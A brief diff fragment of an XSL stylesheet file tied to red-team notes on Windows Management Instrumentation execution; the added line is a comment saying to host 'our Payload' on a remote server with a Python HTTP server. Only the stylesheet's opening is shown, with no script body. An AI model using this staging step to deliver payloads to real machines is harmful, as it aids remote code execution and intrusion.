@@ -1,5 +1,6 @@
 <!-- Resource -->
 <!-- https://dmcxblue.gitbook.io/red-team-notes/execution/windows-management-instrumentation-wmi-->
+<!-- on Remote Server Host our Payload: python3 -m http.server 2020 -->
 
 <?xml version='1.0'?>
 <stylesheet
